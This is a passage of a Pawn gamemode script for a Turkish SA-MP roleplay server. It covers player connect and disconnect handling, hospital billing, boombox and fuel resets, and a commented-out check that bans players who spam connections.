    RemoveBuildingForPlayer(playerid, 647, 1087.1953, -1510.4922, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1084.9688, -1504.4219, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1101.1406, -1527.9688, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1128.7344, -1518.4922, 15.2109, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1111.2578, -1512.3594, 15.2109, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1077.8594, -1499.8672, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1083.6719, -1499.4922, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1106.4375, -1501.3750, 15.2109, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1144.3984, -1512.7891, 15.2109, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1152.3828, -1502.5391, 15.2109, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1153.5391, -1529.8047, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1157.8203, -1525.4844, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1161.3281, -1521.5781, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1165.1563, -1517.2109, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1167.7813, -1513.1797, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1169.1641, -1509.3359, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 647, 1170.8047, -1503.5547, 30.9688, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1219.8516, -1521.3672, 12.6172, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1190.2578, -1503.3906, 12.6641, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1238.9844, -1481.9531, 12.7188, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1118.0156, -1467.4688, 15.2109, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1139.9219, -1467.4688, 15.2109, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1139.9219, -1456.4375, 15.2109, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1118.0156, -1456.4375, 15.2109, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1139.9219, -1445.1016, 15.2109, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1118.0156, -1445.1016, 15.2109, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1139.9219, -1434.0703, 15.2109, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1118.0156, -1434.0703, 15.2109, 0.25);
    RemoveBuildingForPlayer(playerid, 762, 1175.3594, -1420.1875, 19.8828, 0.25);
    RemoveBuildingForPlayer(playerid, 762, 1077.1797, -1420.8125, 17.9531, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1190.2578, -1458.7344, 12.6641, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1238.9844, -1468.0156, 12.7188, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1256.9844, -1443.0313, 12.7188, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1236.2813, -1443.0313, 12.7188, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1190.2578, -1426.3516, 12.6641, 0.25);
    RemoveBuildingForPlayer(playerid, 759, 1183.1875, -1421.2734, 14.3047, 0.25);
    RemoveBuildingForPlayer(playerid, 759, 1182.8125, -1418.8516, 14.3047, 0.25);
    RemoveBuildingForPlayer(playerid, 627, 1230.1250, -1416.5703, 14.1406, 0.25);
    RemoveBuildingForPlayer(playerid, 627, 1209.8984, -1416.5703, 14.1406, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1256.9844, -1417.7031, 12.7188, 0.25);
    RemoveBuildingForPlayer(playerid, 792, 1236.2813, -1417.7031, 12.7188, 0.25);
	//BÝTÝÞ MARKETBAR
	SetSpawnInfo(playerid, 0, 299,  1970.506103, -1201.447143, -25.074676, 1.0, -1, -1, -1, -1, -1, -1);
	SpawnPlayer(playerid); // The player doesn't actually spawn before logging in, this is just to get rid of the annoying "<<", ">>" and "Spawn" buttons.
   	TogglePlayerControllable(playerid, 0);
	return 1;
}

public OnPlayerConnect(playerid) {
	new
	    szPlayerIP[16];

	// Code to patch a SA-MP exploit where you can connect to a SA-MP server multiple times with a bunch of names and completely rape the logs
	// We don't receive attacks like this very often, but I have produced the code so if we ever need it, we have it right in front of us. It requires testing though...
	/*new
	    szPlayerName[MAX_PLAYER_NAME],
	    szPlayerIP[16],
	    szPlayerIPs[16],
		szPlayerNames[MAX_PLAYER_NAME];

	GetPlayerName(playerid, szPlayerName, MAX_PLAYER_NAME);
	GetPlayerIp(playerid, szPlayerIP, sizeof(szPlayerIP));

	foreach(Player, x) {
        GetPlayerName(x, szPlayerNames, MAX_PLAYER_NAME);
        GetPlayerIp(playerid, szPlayerIPs, sizeof(szPlayerIPs));
        if(strfind(szPlayerName, szPlayerNames, true) != -1 && !strcmp(szPlayerIPs, szPlayerIP, true) && IsStringAlphaNumeric(szPlayerNames) == 0)
			return BanEx(playerid, "NieXrlaM client spam attack attempt");
	}*/

	TotalConnect++;
	if(Iter_Count(Player) > MaxPlayersConnected)
	{
		MaxPlayersConnected = Iter_Count(Player);
		getdate(MPYear,MPMonth,MPDay);
	}

	GetPlayerIp(playerid, szPlayerIP, sizeof(szPlayerIP));
	GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 16);

	// Boombox Sistemi
    Boombox[playerid] = 0;
    BoomboxPlayer[playerid] = -1;
    BoomboxStream[playerid] = 0;
    bpos[playerid][0] = 0; bpos[playerid][1] = 0; bpos[playerid][2] = 0; bpos[playerid][3] = 0;
    format(BoomboxURL[playerid], 256, "");
    if(IsValidDynamicObject(BoomboxObject[playerid])) DestroyDynamicObject(BoomboxObject[playerid]);
	// Benzin
	isrefuelling[playerid] = 0;
	FuelBar[playerid] = INVALID_BAR_ID;

    if(!InvalidNameCheck(playerid)) return 1;
	if(CheckBan(szPlayerIP) == 1) {
	    SetPlayerName(playerid, "BannedPlayer");
	    SendClientMessage(playerid, COLOR_CYAN, "Phoenix Role Play'den banlandýn. Forum sitesinden ban temyizi açabilirsin.");
		Kick(playerid);
		return 1;
	}

    KontrolEdildi[playerid] = 0;
	ResetPlayerVariables(playerid);
    SyncPlayerTime(playerid);
	ClearChatbox(playerid);
	SendClientMessage(playerid,COLOR_WHITE,"Karakteriniz veritabanýnda aranýyor lütfen bekleyiniz..");
	SendClientMessage(playerid,COLOR_WHITE,"Harita Yükleniyor..");
	SendClientMessage(playerid,COLOR_WHITE,"Oyuna giriþ yapýlýyor..");
    PlayAudioStreamForPlayer(playerid,"http://k003.kiwi6.com/hotlink/r4t0kg10zw/PRP.mp3");
	SetTimerEx("Login", 7500, 0, "d", playerid);
	GameTextForPlayer(playerid, "~g~HILE TESTI YAPILIYOR..~w~",5000, 5);
	TextDrawShowForPlayer(playerid, ZhaoByMetehan0);
	TextDrawShowForPlayer(playerid, ZhaoByMetehan1);
	TextDrawShowForPlayer(playerid, ZhaoByMetehan2);
	TextDrawShowForPlayer(playerid, ZhaoByMetehan3);
	TextDrawShowForPlayer(playerid, ZhaoByMetehan4);
	TextDrawShowForPlayer(playerid, ZhaoByMetehan5);
	TextDrawShowForPlayer(playerid, ZhaoByMetehan6);
	TextDrawShowForPlayer(playerid, ZhaoByMetehan7);
	TextDrawShowForPlayer(playerid, ZhaoByMetehan8);
	TextDrawShowForPlayer(playerid, ZhaoByMetehan9);
	TextDrawShowForPlayer(playerid, ZhaoByMetehan10);
	TextDrawShowForPlayer(playerid, ZhaoByMetehan11);
	BangaTimer[playerid]=SetTimerEx("Banga", 800,1,"i", playerid);
        //--Para sistem--
	 banka0[playerid] = TextDrawCreate(497.000000, 97.000000, "$0000000");
	 TextDrawBackgroundColor(banka0[playerid], 255);
	 TextDrawFont(banka0[playerid], 3);
     TextDrawLetterSize(banka0[playerid], 0.700000, 2.200000);
     TextDrawColor(banka0[playerid], -32568);
     TextDrawSetOutline(banka0[playerid], 1);
     TextDrawSetProportional(banka0[playerid], 1);
	return 1;
}


// Zaman
forward SyncPlayerTime(playerid);
public SyncPlayerTime(playerid)
{
	new hour, minute, second;
	gettime(hour, minute, second);
	SetPlayerTime(playerid, hour, minute);
	return 1;
}


//-----------------[Get color code by name]----------------------
forward GetColorCode(clr[]);
public GetColorCode(clr[])
{
	new color = -1;

	if(IsNumeric(clr)) {
		color = strval(clr);
		return color;
	}

	if(strcmp(clr, "black", true)==0) color=0;
	if(strcmp(clr, "white", true)==0) color=1;
	if(strcmp(clr, "blue", true)==0) color=2;
	if(strcmp(clr, "red", true)==0) color=3;
	if(strcmp(clr, "green", true)==0) color=16;
	if(strcmp(clr, "purple", true)==0) color=5;
	if(strcmp(clr, "yellow", true)==0) color=6;
	if(strcmp(clr, "lightblue", true)==0) color=7;
	if(strcmp(clr, "navy", true)==0) color=94;
	if(strcmp(clr, "beige", true)==0) color=102;
	if(strcmp(clr, "darkgreen", true)==0) color=51;
	if(strcmp(clr, "darkblue", true)==0) color=103;
	if(strcmp(clr, "darkgrey", true)==0) color=13;
	if(strcmp(clr, "gold", true)==0) color=99;
	if(strcmp(clr, "brown", true)==0 || strcmp(clr, "dennell", true)==0) color=55;
	if(strcmp(clr, "darkbrown", true)==0) color=84;
	if(strcmp(clr, "darkred", true)==0) color=74;
	if(strcmp(clr, "maroon", true)==0) color=115;
	if(strcmp(clr, "pink", true)==0) color=126;
	return color;
}

stock HospitalSpawn(playerid)
{
	if(GetPVarInt(playerid, "DoktorMasrafi") == 1 && PlayerInfo[playerid][pJailed] == 0) {
		if(GetPVarInt(playerid, "Hospital") == 1 && PlayerInfo[playerid][pInsurance] == 0) {
			SetPlayerArmourEx(playerid, PlayerInfo[playerid][pSarmor]);

			if(PlayerInfo[playerid][pDonator] >= 2) SetPlayerHealth(playerid, 100.0);
				else SetPlayerHealth(playerid, 50.0);

			DeletePVar(playerid, "DoktorMasrafi");

			if(PlayerInfo[playerid][pFaction] != 1 && PlayerInfo[playerid][pLeader] != 1 && PlayerInfo[playerid][pFaction] != 3 && PlayerInfo[playerid][pLeader] != 3 && PlayerInfo[playerid][pLeader] != 5 && PlayerInfo[playerid][pFaction] != 5 && PlayerInfo[playerid][pFaction] != 2 && PlayerInfo[playerid][pLeader] != 2 && PlayerInfo[playerid][pConnectTime] > 8) {
				GivePlayerCash(playerid, -200);
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Hastane faturasý $200 geldi. Ýyi günler.");
			}
			else if(PlayerInfo[playerid][pConnectTime] < 9) SendClientMessage(playerid, TEAM_CYAN_COLOR, "Hastane faturan devlet tarafýndan ödendi. (8 saatten az oynadýðýýn için)");
			else SendClientMessage(playerid, TEAM_CYAN_COLOR, "Hastane faturan oluþum sigortan tarafýndan ödendi.");

			GameTextForPlayer(playerid, "~w~Sigortan yok, ~n~sigorta al!", 5000, 6);
			SendClientMessage(playerid, COLOR_WHITE, "(( Hastane içerisindeki sigorta alma noktasýna bak. Daha fazla detay için /sigortayardim yazabilirsin. ))");

			SetPlayerPos(playerid, 1175.0586,-1324.2463,14.5938);
			SetPlayerFacingAngle(playerid, 268.9748);
            DeletePVar(playerid, "Hospital");
			SetCameraBehindPlayer(playerid);
			TogglePlayerControllable(playerid, 1);
		} else if(GetPVarInt(playerid, "Hospital") == 2 && PlayerInfo[playerid][pInsurance] == 0) {
			SetPlayerArmourEx(playerid, PlayerInfo[playerid][pSarmor]);

			if(PlayerInfo[playerid][pDonator] >= 2) SetPlayerHealth(playerid, 100.0);
			else SetPlayerHealth(playerid, 50.0);

			DeletePVar(playerid, "DoktorMasrafi");

			if(PlayerInfo[playerid][pFaction] != 1 && PlayerInfo[playerid][pLeader] != 1 && PlayerInfo[playerid][pFaction] != 3 && PlayerInfo[playerid][pLeader] != 3 && PlayerInfo[playerid][pLeader] != 5 && PlayerInfo[playerid][pFaction] != 5 && PlayerInfo[playerid][pFaction] != 2 && PlayerInfo[playerid][pLeader] != 2 && PlayerInfo[playerid][pConnectTime] > 8) {
				GivePlayerCash(playerid, -200);
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Hastane faturasý $200 geldi. Ýyi günler.");
			}
			else if(PlayerInfo[playerid][pConnectTime] < 9) SendClientMessage(playerid, TEAM_CYAN_COLOR, "Hastane faturan devlet tarafýndan ödendi. (8 saatten az oynadýðýýn için)");
			else SendClientMessage(playerid, TEAM_CYAN_COLOR, "Hastane faturan oluþum sigortan tarafýndan ödendi.");

			GameTextForPlayer(playerid, "~w~Sigortan yok, ~n~sigorta al!", 5000, 6);
			SendClientMessage(playerid, COLOR_WHITE, "(( Hastane içerisindeki sigorta alma noktasýna bak. Daha fazla detay için /sigortayardim yazabilirsin. ))");

			SetPlayerPos(playerid, 2034.2269,-1404.3459,17.2617);
			SetPlayerFacingAngle(playerid, 179.4258);
			DeletePVar(playerid, "Hospital");
			SetCameraBehindPlayer(playerid);
			TogglePlayerControllable(playerid, 1);

		}
		if(GetPVarInt(playerid, "Hospital") == 1 && PlayerInfo[playerid][pInsurance] == 1) {
			SetPlayerArmourEx(playerid, PlayerInfo[playerid][pSarmor]);

			if(PlayerInfo[playerid][pDonator] >= 2) SetPlayerHealth(playerid, 100.0);
			else SetPlayerHealth(playerid, 50.0);

			DeletePVar(playerid, "DoktorMasrafi");

			if(PlayerInfo[playerid][pFaction] != 1 && PlayerInfo[playerid][pLeader] != 1 && PlayerInfo[playerid][pFaction] != 3 && PlayerInfo[playerid][pLeader] != 3 && PlayerInfo[playerid][pLeader] != 5 && PlayerInfo[playerid][pFaction] != 5 && PlayerInfo[playerid][pFaction] != 2 && PlayerInfo[playerid][pLeader] != 2 && PlayerInfo[playerid][pConnectTime] > 8) {
				GivePlayerCash(playerid, -150);
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Hastane faturasý $150 geldi. Ýyi günler.");
			}
			else if(PlayerInfo[playerid][pConnectTime] < 9) SendClientMessage(playerid, TEAM_CYAN_COLOR, "Hastane faturan devlet tarafýndan ödendi. (8 saatten az oynadýðýýn için)");
			else SendClientMessage(playerid, TEAM_CYAN_COLOR, "Hastane faturan oluþum sigortan tarafýndan ödendi.");

			SetPlayerPos(playerid, 1175.0586,-1324.2463,14.5938);
			SetPlayerFacingAngle(playerid, 268.9748);
            DeletePVar(playerid, "Hospital");
			SetCameraBehindPlayer(playerid);
			TogglePlayerControllable(playerid, 1);
		} else if(GetPVarInt(playerid, "Hospital") == 2 && PlayerInfo[playerid][pInsurance] == 2) {
			SetPlayerArmourEx(playerid, PlayerInfo[playerid][pSarmor]);

			if(PlayerInfo[playerid][pDonator] >= 2) SetPlayerHealth(playerid, 100.0);
			else SetPlayerHealth(playerid, 50.0);

			DeletePVar(playerid, "DoktorMasrafi");

			if(PlayerInfo[playerid][pFaction] != 1 && PlayerInfo[playerid][pLeader] != 1 && PlayerInfo[playerid][pFaction] != 3 && PlayerInfo[playerid][pLeader] != 3 && PlayerInfo[playerid][pLeader] != 5 && PlayerInfo[playerid][pFaction] != 5 && PlayerInfo[playerid][pFaction] != 2 && PlayerInfo[playerid][pLeader] != 2 && PlayerInfo[playerid][pConnectTime] > 8) {
				GivePlayerCash(playerid, -150);
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Hastane faturasý $150 geldi. Ýyi günler.");
			}
			else if(PlayerInfo[playerid][pConnectTime] < 9) SendClientMessage(playerid, TEAM_CYAN_COLOR, "Hastane faturan devlet tarafýndan ödendi. (8 saatten az oynadýðýýn için)");
			else SendClientMessage(playerid, TEAM_CYAN_COLOR, "Hastane faturan oluþum sigortan tarafýndan ödendi.");

			SetPlayerPos(playerid, 2034.2269,-1404.3459,17.2617);
			SetPlayerFacingAngle(playerid, 179.4258);
			DeletePVar(playerid, "Hospital");
			SetCameraBehindPlayer(playerid);
			TogglePlayerControllable(playerid, 1);
		}
	}
}

public OnPlayerDisconnect(playerid, reason)
{
    // Crash Fix
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof(name));
	if(!strcmp(name, "InvalidNick", true)) return 1;
	if(!strcmp(name, "BannedPlayer", true)) return 1;
	if(playerid == MAX_PLAYERS) return 1;
	DestroyDynamic3DTextLabel(PetText[playerid]);
	if(AdminDuty[playerid] == 1) {
		WasHereForPaycheck[playerid] = GetPVarInt(playerid, "washereforpaycheck");
		SignedPaycheck[playerid] = GetPVarInt(playerid, "signedpaycheck");
		MissedPaychecks[playerid] = GetPVarInt(playerid, "missedpaychecks");
		PayCheckCode[playerid] = GetPVarInt(playerid, "paycheckcode");
		PlayerInfo[playerid][pPayReady] = GetPVarInt(playerid, "payready");
		PlayerInfo[playerid][pPayCheck] = GetPVarInt(playerid, "paycheck");
	}
	AdminDuty[playerid] = 0;
	AdminLoggedInBefore[playerid] = 0;
	DeletePVar(playerid, "washereforpaycheck");
	DeletePVar(playerid, "signedpaycheck");
	DeletePVar(playerid, "missedpaychecks");
	DeletePVar(playerid, "paycheckcode");
	DeletePVar(playerid, "payready");
	DeletePVar(playerid, "paycheck");

	if(GetPVarInt(playerid, "PBM") > 0) {
		new
		    szMessage[64];
		format(szMessage, sizeof(szMessage), "%s adlý oyuncu paintballdan ayrýldý(düþtü).", GetPlayerNameEx(playerid));
		foreach(Player, i) {
			if(GetPVarInt(i, "PBM") > 0 && GetPVarInt(i, "PBM") == GetPVarInt(playerid, "PBM") && i != playerid)
			    SendClientMessage(i, COLOR_RED, szMessage);
		}
		DeletePVar(playerid, "PBMK");
		DeletePVar(playerid, "PBMD");
		DeletePVar(playerid, "PBMS");
		DeletePVar(playerid, "IsFrozen");
		PaintballTeam[playerid] = 0;
		SetPlayerHealth(playerid, GetPVarFloat(playerid, "pbhealth"));
		SetPlayerArmourEx(playerid, GetPVarFloat(playerid, "pbarmour"));
		DeletePVar(playerid, "pbhealth");
		DeletePVar(playerid, "pbarmour");
    }
    // Boombox Sistemi
	Boombox[playerid] = 0;
    BoomboxPlayer[playerid] = -1;
    BoomboxStream[playerid] = 0;
    bpos[playerid][0] = 0; bpos[playerid][1] = 0; bpos[playerid][2] = 0; bpos[playerid][3] = 0;
    format(BoomboxURL[playerid], 256, "");
    if(IsValidDynamicObject(BoomboxObject[playerid])) DestroyDynamicObject(BoomboxObject[playerid]);
    for(new i=0; i<MAX_PLAYERS; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(BoomboxPlayer[i] == playerid)
            {
                BoomboxStream[i] = 0;
                BoomboxPlayer[i] = -1;
                StopAudioStreamForPlayer(i);
                SendClientMessage(i, COLOR_WHITE, "Boombox kaldýrýldý!");
            }
        }
    }
 	if(GetPVarInt(playerid, "fuelonoff") == 1)
 	{
 	    HideProgressBarForPlayer(playerid, FuelBar[playerid]);
		SetPVarInt(playerid, "fuelonoff", 0);
		DestroyProgressBar(FuelBar[playerid]);
		FuelBar[playerid] = INVALID_BAR_ID;
	}

	if(pTazer[playerid] == 1) GivePlayerValidWeapon(playerid,pTazerReplace[playerid],60000);
	if(GetPVarInt(playerid, "Hiz Radari") == 1) GivePlayerValidWeapon(playerid, GetPVarInt(playerid, "RadarReplacement"), 60000);

	if(GetPVarInt(playerid, "PBM") == 0 && GetPVarInt(playerid, "EventToken") == 0 && AdminDuty[playerid] == 0) {
		new Float: fArmour;
		if(GetPlayerArmour(playerid, fArmour) < ValidArmor[playerid]) GetPlayerArmour(playerid, PlayerInfo[playerid][pArmor]);
		else PlayerInfo[playerid][pArmor] = ValidArmor[playerid];
		GetPlayerHealth(playerid, PlayerInfo[playerid][pHealth]);
	}

	if(IsCopDragging[playerid] != INVALID_PLAYER_ID)
	{
		PlayerDraggedBy[IsCopDragging[playerid]] = INVALID_PLAYER_ID;
		PlayerDragged[IsCopDragging[playerid]] = 0;
	}

	// print("[debug] step #2");

	if(GetPVarInt(playerid, "MovingStretcher") != -1) {
	    KillTimer(GetPVarInt(playerid, "TickEMSMove"));
	    DeletePVar(GetPVarInt(playerid, "MovingStretcher"), "OnStretcher");
	    SetPVarInt(playerid, "MovingStretcher", -1);
	}

	// print("[debug] step #3");

	if(IsValidDynamic3DTextLabel(Helper[playerid])) DestroyDynamic3DTextLabel(Helper[playerid]);

	if(IsValidDynamicObject(PlayerInfo[playerid][pWeedObject]))
	{
		DestroyDynamicObject(PlayerInfo[playerid][pWeedObject]);
	}

	if(IsValidDynamicObject(GetPVarInt(playerid, "SirenO")) && GetPVarInt(playerid, "SirenO") > 0) {
		DestroyDynamicObject(GetPVarInt(playerid, "SirenO"));
		DeletePVar(playerid, "SirenO");
	}

	// print("[debug] step #4");

	if(IsValidDynamicObject(BoomboxInfo[playerid][bbObject]))
	{
	    DestroyDynamicObject(BoomboxInfo[playerid][bbObject]);

   		foreach(Player, i)
		{
			if(IsPlayerInRangeOfPoint(i,150.0,BoomboxInfo[playerid][bbPosX],BoomboxInfo[playerid][bbPosY],BoomboxInfo[playerid][bbPosZ]) && GetPlayerInterior(i) == BoomboxInfo[playerid][bbInt] && GetPlayerVirtualWorld(i) == BoomboxInfo[playerid][bbVW])
			{
				StopAudioStreamForPlayer(i);
			}
		}
	}
    KontrolEdildi[playerid] = 0;
	// print("[debug] step #5");

	IsCopDragging[playerid] = INVALID_PLAYER_ID;
	PlayerDraggedBy[playerid] = INVALID_PLAYER_ID;
	PlayerDragged[playerid] = 0;

	// print("[debug] step #6");

	if(GetPVarInt(playerid, "PBM") < 1) {
		if(GetPVarInt(playerid, "Hospital") > 0) {
		    PlayerInfo[playerid][pHospital] = 1;
		}

		if(GetPVarInt(playerid, "Injured") == 1) {
		    PlayerInfo[playerid][pHospital] = 1;
		    KillEMSQueue(playerid);
	        ResetPlayerWeaponsEx(playerid);
		}
		PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
		GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
		GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
	}

	// print("[debug] step #7");

	if(PlayerInfo[playerid][pLockCar] != INVALID_VEHICLE_ID)
		vehicle_unlock_doors(PlayerInfo[playerid][pLockCar]);

	if(PlayerInfo[playerid][pVehicleKeysFrom] != INVALID_PLAYER_ID)
        PlayerVehicleInfo[PlayerInfo[playerid][pVehicleKeysFrom]][PlayerInfo[playerid][pVehicleKeys]][pvAllowedplayerid] = INVALID_PLAYER_ID;

 	InsideShamal[playerid] = INVALID_VEHICLE_ID;

	// print("[debug] step #9");

	if(GetPlayerSkin(playerid) == 155)
	    PlayerInfo[playerid][pSkin] = GetPVarInt(playerid, "NPS");

	if(InsideShamal[playerid] != INVALID_VEHICLE_ID) {
		if(InsideShamal[playerid] == INVALID_VEHICLE_ID || GetVehicleModel(InsideShamal[playerid]) != 519)
		{
			GivePlayerValidWeapon(playerid, 46, 60000);
			PlayerInfo[playerid][pPos_x] = 0.000000;
			PlayerInfo[playerid][pPos_y] = 0.000000;
			PlayerInfo[playerid][pPos_z] = 420.000000;
		}
		else
		{
			new Float:X, Float:Y, Float:Z;
			GetVehiclePos(InsideShamal[playerid], X, Y, Z);
			PlayerInfo[playerid][pPos_x] = X;
			PlayerInfo[playerid][pPos_y] = Y;
			PlayerInfo[playerid][pPos_z] = Z;

			new Float:XB, Float:YB, Float:ZB;
			GetVehiclePos(InsideShamal[playerid], XB, YB, ZB);
			if(ZB > 50.0)
			{
				GivePlayerValidWeapon(playerid, 46, 60000);
			}
		}
		PlayerInfo[playerid][pVW] = 0;
		SetPlayerVirtualWorld(playerid, 0);
		PlayerInfo[playerid][pInt] = 0;
		SetPlayerInterior(playerid, 0);
		InsideShamal[playerid] = INVALID_VEHICLE_ID;
	}

    // print("[debug] step #10");

	// Impound the vehicle if it is currently being towed...
    for(new x = 0; x < MAX_PLAYERVEHICLES; x++) {
		foreach(Player, i) {
		    if(arr_Towing[i] == PlayerVehicleInfo[playerid][x][pvId] && arr_Towing[i] != INVALID_VEHICLE_ID) {
		        PlayerVehicleInfo[playerid][x][pvImpounded] = 1;
		        arr_Towing[i] = INVALID_VEHICLE_ID;
		        DestroyVehicle(PlayerVehicleInfo[playerid][x][pvId]);
			}
		}
	}

	// print("[debug] step #11");

	// If the player (prior to leaving) is in range of any of their own player vehicles, the position will save without having to use /park
	if(reason == 0) {
	    new
	        Float: fPlayerVehiclePos[3];

	    for(new x = 0; x < MAX_PLAYERVEHICLES; x++) {
	        GetVehiclePos(PlayerVehicleInfo[playerid][x][pvId], fPlayerVehiclePos[0], fPlayerVehiclePos[1], fPlayerVehiclePos[2]);
	        if(IsPlayerInRangeOfPoint(playerid, 50, fPlayerVehiclePos[0], fPlayerVehiclePos[1], fPlayerVehiclePos[2])) {
	            PlayerVehicleInfo[playerid][x][pvPosX] = fPlayerVehiclePos[0];
	            PlayerVehicleInfo[playerid][x][pvPosY] = fPlayerVehiclePos[1];
	            PlayerVehicleInfo[playerid][x][pvPosZ] = fPlayerVehiclePos[2];
	            GetVehicleZAngle(playerid, PlayerVehicleInfo[playerid][x][pvPosAngle]);
	        }
	    }
	}

	// print("[debug] step #12");

	UnloadPlayerVehicles(playerid);
	ResetPlayerWeapons(playerid);

	// print("[debug] step #13");

	for(new i = 0; i < MAX_REPORTS; i++) {
	    if(Reports[i][ReportFrom] == playerid) {
	        Reports[i][ReportFrom] = 999;
			Reports[i][BeingUsed] = 0;
			Reports[i][TimeToExpire] = 0;
		}
	}

	// print("[debug] step #14");

	foreach(Player, i)
	{
		if(TaxiAccepted[i] == playerid)
		{
			TaxiAccepted[i] = 999;
			GameTextForPlayer(i, "~w~Taksi cagiran kisi~n~~r~oyundan cikti", 5000, 1);
			TaxiCallTime[i] = 0;
			DisablePlayerCheckpoint(i);
		}
		if(EMSAccepted[i] == playerid)
		{
			EMSAccepted[i] = INVALID_PLAYER_ID;
			GameTextForPlayer(i, "~w~Ambulans cagiran kisi~n~~r~oyundan cikti", 5000, 1);
			EMSCallTime[i] = 0;
			DisablePlayerCheckpoint(i);
		}
		if(BusAccepted[i] == playerid)
		{
			BusAccepted[i] = 999;
			GameTextForPlayer(i, "~w~Otobus cagiran kisi~n~~r~oyundan cikti", 5000, 1);
			BusCallTime[i] = 0;
			DisablePlayerCheckpoint(i);
		}
		if(MedicAccepted[i] == playerid)
		{
			TaxiAccepted[playerid] = 999; BusAccepted[playerid] = 999; MedicAccepted[playerid] = 999;
			GameTextForPlayer(i, "~w~Doktor cagiran kisi~n~~r~oyundan cikti", 5000, 1);
			MedicCallTime[i] = 0;
			DisablePlayerCheckpoint(i);
		}
	}

	// print("[debug] step #14");

	if(Spectate[playerid] < 553)
	{
        PlayerInfo[playerid][pInt] = GetPVarInt(playerid, "SpecInt");
		PlayerInfo[playerid][pVW] = GetPVarInt(playerid, "SpecVW");
		PlayerInfo[playerid][pPos_x] = GetPVarFloat(playerid, "SpecPosX");
		PlayerInfo[playerid][pPos_y] = GetPVarFloat(playerid, "SpecPosY");
		PlayerInfo[playerid][pPos_z] = GetPVarFloat(playerid, "SpecPosZ");
	    GettingSpectated[Spectate[playerid]] = 999;
	    Spectate[playerid] = 999;
	}

	// print("[debug] step #15");

	if(GetPVarInt(playerid, "gpsonoff") == 1) TextDrawDestroy(GPS[playerid]);
	if(RadarActive[playerid] == 1) {
		TextDrawDestroy(RadarTitle[playerid]);
		TextDrawDestroy(RadarContext[playerid]);
	}

	// print("[debug] step #16");

	if(PlayerBoxing[playerid] > 0)
	{
		if(Boxer1 == playerid)
		{
			if(IsPlayerConnected(Boxer2))
			{
				if(IsPlayerInRangeOfPoint(PlayerBoxing[Boxer2], 25.0, 765.952270, 4.167977, 1000.719238))
				{
					PlayerBoxing[Boxer2] = 0;
					SetPlayerPos(Boxer2, 765.952270, 4.167977, 1000.719238);
					SetPlayerInterior(Boxer2, 5);
					GameTextForPlayer(Boxer2, "~r~Macta aksaklik oldu", 5000, 1);
					return 1;
				}
			}
		}
		else if(Boxer2 == playerid)
		{
			if(IsPlayerConnected(Boxer1))
			{
				if(IsPlayerInRangeOfPoint(PlayerBoxing[Boxer1],25.0,765.952270, 4.167977, 1000.719238))
				{
					PlayerBoxing[Boxer1] = 0;
					SetPlayerPos(Boxer1, 765.952270, 4.167977, 1000.719238);
					SetPlayerInterior(Boxer1, 5);
					GameTextForPlayer(Boxer1, "~r~Macta aksaklik oldu", 5000, 1);
					return 1;
				}
			}
		}
		InRing = 0;
	 	RoundStarted = 0;
		Boxer1 = INVALID_PLAYER_ID;
		Boxer2 = INVALID_PLAYER_ID;
	}

	// print("[debug] step #16");

	new string[128];

	if(Spectating[playerid] == 0 && AdminDuty[playerid] == 0) {
		switch(reason) {
	 	   	case 0: {
			   	format(string, sizeof(string), "%s adlý oyuncu oyundan düþtü(baðlantýsý koptu).", GetPlayerNameEx(playerid));
			   	ProxDetector(30.0, playerid, string, COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);

			   	if(PlayerCuffed[playerid] != 0) {
		    		strcpy(PlayerInfo[playerid][pPrisonedBy], "Server", 64);
					strcpy(PlayerInfo[playerid][pPrisonReason], "Kelepçeliyken oyundan düþtü(baðlantýsý koptu).", 64);

	                PlayerInfo[playerid][pJailed] = 3;
					PlayerInfo[playerid][pJailTime] += 55*60;
				}
		   	}
		   	case 1: {
			   	format(string, sizeof(string), "%s adlý oyuncu oyundan çýktý(kendi isteðiyle)", GetPlayerNameEx(playerid));
			   	ProxDetector(30.0, playerid, string, COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);

